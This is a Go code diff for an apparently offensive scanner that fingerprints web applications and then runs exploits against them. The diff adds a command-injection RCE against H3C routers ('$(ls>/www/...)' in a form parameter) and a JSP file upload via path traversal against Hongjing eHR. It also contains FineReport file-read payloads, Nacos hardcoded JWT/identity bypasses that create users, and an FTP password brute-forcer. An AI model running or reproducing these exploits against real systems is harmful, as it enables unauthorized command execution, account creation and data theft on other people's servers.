@@ -11,9 +11,9 @@ import (
 	"sync"
 
 	"gopkg.in/ini.v1"
-    "net/http"
-    "io/ioutil"
-    "time"
+    	"net/http"
+    	"io/ioutil"
+   	"time"
 	"crypto/tls"
 	"regexp"
 	"bytes"
@@ -78,26 +78,22 @@ func (s *FinScan)StartScan() {
 			s.fingerScan()
 		}()
 	}
-	//读取config.ini
+
     cfg, err := ini.Load("poc.ini")
     if err != nil {
         fmt.Println("无法加载配置文件:", err)
-        //return
     }
     // 获取poc值
     poc := cfg.Section("").Key("poc").String()
-	//获取brute值
 	brute:=cfg.Section("").Key("brute").String()
 
-	// 创建一个自定义的 http.Transport，并禁用证书验证
+
 	transport := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
-
-    // 创建具有超时设置的HTTP客户端
 	
     client := &http.Client{
-    Timeout: time.Second * 10, // 设置超时时间为10秒
+    Timeout: time.Second * 10,
 	Transport: transport,
     }
 
@@ -108,10 +104,9 @@ func (s *FinScan)StartScan() {
 		fmt.Printf(fmt.Sprintf("[ %s | ", aas.Url))
 		color.RGBStyleFromString("237,64,35").Printf(fmt.Sprintf("%s", aas.Cms))
 		fmt.Printf(fmt.Sprintf(" | %s | %d | %d | %s ]\n", aas.Server, aas.Statuscode, aas.Length, aas.Title))
-	    //poc
-	    //fmt.Println("poc的值:", poc)
+
+
         if poc =="yes"{
-			//fmt.Println(aas.Cms) thinkphp
             if strings.Contains(aas.Cms, "ThinkPHP"){
                 currentTime := time.Now()
 	            formattedTime := currentTime.Format("06_01_02")
@@ -315,7 +310,7 @@ func (s *FinScan)StartScan() {
 
 			}
 			//帆软报表
-			if strings.Contains(aas.Cms, "帆软报表-FineReport"){
+			if strings.Contains(aas.Cms, "帆软报表-FineReport")||strings.Contains(aas.Cms, "帆软数据决策系统")||strings.Contains(aas.Cms, "帆软报表 V8"){
 				payloads:= []string{
 					//V8 get_geo_json 任意文件读取漏洞 CNVD-2018-04757
 					"/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml",
@@ -810,7 +805,12 @@ func (s *FinScan)StartScan() {
 			}
 			//H3C IMC
 			//H3C IMC dynamiccontent.properties.xhtm 远程命令执行
-			if strings.Contains(aas.Cms, "H3C IMC"){
+			if strings.Contains(aas.Cms, "H3C"){
+				h3c_rce_res:=h3c_rce(aas.Url)
+				if h3c_rce_res !=""{
+					fmt.Println(h3c_rce_res)
+				}
+
 				headers := http.Header{}
 				headers.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
 				headers.Set("Content-Type", "application/x-www-form-urlencoded")
@@ -954,6 +954,10 @@ func (s *FinScan)StartScan() {
 				if hj_eHR_res !=""{
 					fmt.Println(hj_eHR_res)
 				}
+				hj_eHR_rce_res:=hj_eHR_rce(aas.Url)
+				if hj_eHR_rce_res !=""{
+					fmt.Println(hj_eHR_rce_res)
+				}
 			}
 			//金蝶云星空
 			if strings.Contains(aas.Cms, "金蝶云星空"){
@@ -984,6 +988,55 @@ func (s *FinScan)StartScan() {
 	if s.Output != "" {
 		outfile(s.Output, s.AllResult)
 	}
+}
+
+//H3C多系列路由器前台RCE漏洞
+func h3c_rce(url string) string{
+	bodys:=""
+	vurl:=url+"/goform/aspForm"
+	vurl1:=url+"/lemonlove777"
+	data:="CMD=DelL2tpLNSList&GO=vpn_l2tp_session.asp&param=1; $(ls>/www/lemonlove777);"
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+			Dial: (&net.Dialer{
+				Timeout: 5 * time.Second, // 设置连接超时时间
+			}).Dial,
+		},
+	}
+	req, err := http.NewRequest("POST", vurl, bytes.NewBuffer([]byte(data)))
+	if err != nil {
+		return ""
+	}
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
+	maxRetries := 3
+	retryCount := 0
+	for retryCount < maxRetries {
+		resp, err := client.Do(req)
+		if err != nil {
+			retryCount++
+			continue
+		}
+		defer resp.Body.Close()
+		resp1, err := client.Get(vurl1)
+		if err != nil {
+			return ""
+		}
+		defer resp1.Body.Close()
+		body, err := ioutil.ReadAll(resp1.Body)
+		if err != nil {
+			return ""
+		}
+		bodys=string(body)
+		if resp1.StatusCode == http.StatusOK { // 判断返回值是否为200
+			//fmt.Println("存在漏洞")
+			return "[+] 存在H3C多系列路由器前台RCE漏洞,漏洞URL："+vurl
+		}
+		break
+
+	}
+	return bodys
 }
 
 
@@ -1026,7 +1079,7 @@ func yync_qt(url string) string{
 		}
 		bodys=string(respBody)
 		if resp.StatusCode == http.StatusOK || len(bodys)==0 { // 判断返回值是否为200
-			fmt.Println("存在漏洞")
+			//fmt.Println("存在漏洞")
 			return "[+] 存在用友NC Cloud存在前台远程命令执行漏洞,漏洞URL："+vurl
 		}
 		break
@@ -1175,6 +1228,65 @@ func hj_eHR(url string) string{
 	return bodys
 }
 
+//宏景eHR文件上传
+func hj_eHR_rce(url string) string{
+	bodys:=""
+	// // 读取文件内容
+	// content, err := ioutil.ReadFile("1.txt")
+	// if err != nil {
+	// 	return ""
+	// }
+	// // 打印文件内容
+	// payload:=string(content)
+
+	// 创建一个自定义的 http.Transport，并禁用证书验证
+	transport := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	// 创建具有超时设置的HTTP客户端
+	client := &http.Client{
+	Timeout: time.Second * 50, // 设置超时时间为10秒
+	Transport: transport,
+	}
+	payload:=`DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ
+OPTION=U0FWRUZJTEU=
+currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
+FILETYPE=Li5cNDAzLmpzcA==
+RECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
+originalFileId=wV66
+originalCreateDate=wUghPB3szB3Xwg66
+FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
+needReadFile=yRWZdAS6
+originalCreateDate=wLSGP4oEzLKAz4=iz=66
+
+<%out.println("hello1");%>`
+
+	vurl := url+"/w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp"
+	req, err := http.NewRequest("POST", vurl, strings.NewReader(payload))
+	if err !=nil{
+		return ""
+	}
+	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
+	resp, err := client.Do(req)
+	if err != nil{
+		return ""
+	}
+
+	defer resp.Body.Close()
+
+	body, _ := ioutil.ReadAll(resp.Body)
+	
+	//fmt.Println(string(body))
+
+	bodys=string(body)
+	if resp.StatusCode == http.StatusOK{
+		return "[+] 存在宏景eHR文件上传漏洞,漏洞URL："+url+"/w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp"
+	}else{
+		bodys=""
+	}
+	return bodys
+}
+
 
 
 //Apache Tomcat
@@ -1301,9 +1413,7 @@ func Nacos_unauthorized(url string) string{
 			continue
 		}
 		bodyStr = string(bodyBytes)
-		//return bodyStr
 		if strings.Contains(bodyStr,"password"){
-			//fmt.Println(bodys)
 			return "[+] 存在Nacos未授权访问漏洞 漏洞url："+vurl
 		}else{
 			bodyStr=""
@@ -1321,9 +1431,8 @@ func Nacos_jwt(url string) string{
 	transport := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
-	// 创建具有超时设置的HTTP客户端
 	client := &http.Client{
-	Timeout: time.Second * 10, // 设置超时时间为10秒
+	Timeout: time.Second * 10,
 	Transport: transport,
 	}
 	payloads:= []string{
@@ -1347,7 +1456,6 @@ func Nacos_jwt(url string) string{
 			headers.Set("Content-Type", "application/x-www-form-urlencoded")
 			headers.Set("Authorization","Bearer "+payload)
 			vurl:=url+path
-			//fmt.Println(path+":"+payload)
 			req, err := http.NewRequest("POST", vurl, strings.NewReader(data))
 			if err != nil {
 				continue
@@ -1365,7 +1473,6 @@ func Nacos_jwt(url string) string{
 			}
 			bodys=string(body)
 			if strings.Contains(bodys,"Bearer")|| strings.Contains(bodys,"accessToken"){
-				//fmt.Println(bodys)
 				return "[+] 存在Nacos jwt secret key 硬编码绕过 漏洞url："+vurl+"\n[+] data:"+payload
 			}else{
 				bodys=""
@@ -1381,11 +1488,9 @@ func Nacos_jwt(url string) string{
 //开启授权后identity硬编码绕过
 func Nacos_identity(url string) string{
 	bodys:=""
-	// 创建一个自定义的 http.Transport，并禁用证书验证
 	transport := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
-	// 创建具有超时设置的HTTP客户端
 	client := &http.Client{
 	Timeout: time.Second * 10, // 设置超时时间为10秒
 	Transport: transport,
@@ -1414,18 +1519,16 @@ func Nacos_identity(url string) string{
 			// // 生成一个随机符号
 			symbols := []byte("!@#$%^&*()")
 			randomSymbol := symbols[rand.Intn(len(symbols))]
-			// fmt.Printf("%c\n", randomSymbol)
 			nacos:=fmt.Sprintf("nacos%c%c%c%c",randomLetter,randomNumber,randomSymbol,randomLetter)
 			passds:="nacos@2023"
 
 			data := fmt.Sprintf("username=%s&password=%s",nacos,passds)
-			//fmt.Println(data)
+			fmt.Println(data)
 
 			headers := http.Header{}
 			headers.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
 			headers.Set("Content-Type", "application/x-www-form-urlencoded")
 			headers.Set(key, value)
-			//fmt.Println(path,":",key, ":", value)
 			vurl := url + path
 			req, err := http.NewRequest("POST", vurl, strings.NewReader(data))
 			if err != nil {
@@ -1444,8 +1547,7 @@ func Nacos_identity(url string) string{
 			}
 			bodys := string(body)
 			if strings.Contains(bodys, "create user ok") {
-				//fmt.Println("[+] 存在Nacos开启授权后identity硬编码绕过漏洞 账号密码：" + nacos+":"+passds)
-				return "[+] 存在Nacos开启授权后identity硬编码绕过漏洞 账号密码：" + nacos+":"+passds
+				return "[+] 存在Nacos开启授权后identity硬编码绕过漏洞 账号密码：" + nacos+":"+passds+":"+key+value
 			}
 
 		}
@@ -1480,21 +1582,17 @@ func (s *FinScan)fingerScan() {
 		switch dataface.(type){
 		case []string:
 			url := dataface.([]string)
-			//fmt.Println(url[0])
-			//ftp识别
 			host := getHostFromURL(url[0])
-			//fmt.Println("去除//之后的值:", host)
 			che_ftp:=checkFTPPort(host)
 			if che_ftp{
 				out := Outrestul{host, "FTP", "", 0, 0, ""}
-				s.FocusResult = append(s.FocusResult, out) // 将FTP服务添加到重点资产中
+				s.FocusResult = append(s.FocusResult, out)
 			}
 
 			var data *resps
 			data, err := httprequest(url, s.Proxy)
 			
 			if err != nil {
-				//fmt.Println(url[0])
 				url[0] = strings.ReplaceAll(url[0], "https://", "http://")
 				data, err = httprequest(url, s.Proxy)
 				
@@ -1502,20 +1600,50 @@ func (s *FinScan)fingerScan() {
 					continue
 				}
 			}
-			//添加nacos识别
-			if data.statuscode == 404 && strings.Contains(url[0],"8848"){
-				// 在URL后面添加"/nacos"
-				urlWithNacos := url[0] + "/nacos"
-				//fmt.Println(urlWithNacos)
 
-				// 使用包含"/nacos"的URL重试请求
+			if data.statuscode == 404 && strings.Contains(url[0],"8848"){
+
+				urlWithNacos := url[0] + "/nacos"
+				fmt.Println(urlWithNacos)
+
 				data, err = httprequest([]string{urlWithNacos, "1"}, s.Proxy)
 				if err != nil {
 					continue
 				}
 			}
 
+			cfg, err := ini.Load("poc.ini")
+			if err != nil {
+				fmt.Println("无法加载配置文件:", err)
+			}
+			route:=cfg.Section("").Key("route").String()
+			url_paths:=[]string{
+				"",
+			}
+			if route=="yes"{
+				filePath := "./dict/path.txt"
 
+				file, err := os.Open(filePath)
+				if err != nil {
+					fmt.Println("打开文件时出错:", err)
+					return
+				}
+				defer file.Close()
+
+				scanner := bufio.NewScanner(file)
+				for scanner.Scan() {
+					line := scanner.Text()
+					url_paths = append(url_paths, line)
+				}
+				if err := scanner.Err(); err != nil {
+					fmt.Println("读取文件时出错:", err)
+					return
+				}
+			
+			}
+			for _,url_path := range url_paths{
+				urlWithroute := url[0] + url_path
+				data, err = httprequest([]string{urlWithroute, "1"}, s.Proxy)
 
 			for _, jurl := range data.jsurl {
 				if jurl != "" {
@@ -1531,6 +1659,7 @@ func (s *FinScan)fingerScan() {
 							cms = append(cms, finp.Cms)
 						}
 					}
+
 					if finp.Method == "faviconhash" {
 						if data.favhash == finp.Keyword[0] {
 							cms = append(cms, finp.Cms)
@@ -1579,6 +1708,7 @@ func (s *FinScan)fingerScan() {
 				outstr := fmt.Sprintf("[ %s | %s | %s | %d | %d | %s ]", out.Url, out.Cms, out.Server, out.Statuscode, out.Length, out.Title)
 				fmt.Println(outstr)
 			}
+			}
 		default:
 			continue
 		}
@@ -1592,8 +1722,7 @@ func getHostFromURL(rawURL string) string {
 	}
 	parsedURL, err := url.Parse(rawURL)
 	if err != nil {
-		//fmt.Println("解析URL错误:", err)
-		return "" // 或者返回其他合适的错误处理方式
+		return ""
 	}
 	host := parsedURL.Host
 	return host
@@ -1606,7 +1735,6 @@ func checkFTPPort(host string) bool {
 	}
 	defer conn.Close()
 
-	// 设置超时时间为5秒
 	conn.SetDeadline(time.Now().Add(5000 * time.Millisecond))
 
 	fmt.Fprintf(conn, "HEAD / HTTP/1.0\r\n\r\n")
@@ -1629,17 +1757,13 @@ func checkFTPPort(host string) bool {
 	return false
 }
 
-//ftp爆破
 
 func ftp_bp(Hostport string) {
-	// 创建一个通道用于接收结果
 	resultChan := make(chan string)
-	stopChan := make(chan struct{}) // 用于发送停止信号给其他 goroutine
+	stopChan := make(chan struct{})
 
-	// 创建一个等待组来等待所有 goroutine 完成
 	var wg sync.WaitGroup
 
-	// 打开文件0
 	file, err := os.Open("./dict/user.txt")
 	if err != nil {
 		fmt.Println("无法打开文件:", err)
@@ -1647,7 +1771,6 @@ func ftp_bp(Hostport string) {
 	}
 	defer file.Close()
 
-	// 创建一个 Scanner 对象来读取文件内容
 	scanner := bufio.NewScanner(file)
 
 	for scanner.Scan() {
@@ -1663,20 +1786,17 @@ func ftp_bp(Hostport string) {
 		for passScanner.Scan() {
 			select {
 			case <-stopChan:
-				// 收到停止信号，直接返回
 				return
 			default:
 				Password := passScanner.Text()
 
-				wg.Add(1) // 增加等待组计数器
+				wg.Add(1)
 
 				go func(username, password string) {
-					defer wg.Done() // 减少等待组计数器
+					defer wg.Done()
 
 					conn, err := ftp.DialTimeout(Hostport, time.Second*30)
 					if err != nil {
-						//result := fmt.Sprintf("FTP connection error %s %s %s", Hostport, username, password)
-						// resultChan <- result
 						return
 					}
 					defer conn.Quit()
@@ -1685,7 +1805,6 @@ func ftp_bp(Hostport string) {
 					if err == nil {
 						result := fmt.Sprintf("[+] Found FTP:%s username:%s password:%s", Hostport, username, password)
 						resultChan <- result
-						// 发送停止信号给其他 goroutine
 						select {
 						case stopChan <- struct{}{}:
 						default:
@@ -1693,8 +1812,6 @@ func ftp_bp(Hostport string) {
 						return
 					}
 
-					//result := fmt.Sprintf("FTP password error %s %s %s", Hostport, username, password)
-					//resultChan <- result
 				}(Username, Password)
 			}
 		}
@@ -1704,21 +1821,16 @@ func ftp_bp(Hostport string) {
 		}
 	}
 
-	// 启动一个 goroutine 来等待所有任务完成，并关闭结果通道
 	go func() {
-		wg.Wait()          // 等待所有任务完成
-		close(resultChan) // 关闭结果通道
+		wg.Wait()
+		close(resultChan)
 	}()
 
-	// 从通道中读取并打印结果
 	for result := range resultChan {
 		fmt.Println(result)
 	}
 
-	// 检查是否有错误发生
 	if err := scanner.Err(); err != nil {
 		fmt.Println("读取文件时发生错误:", err)
 	}
 }
-
-
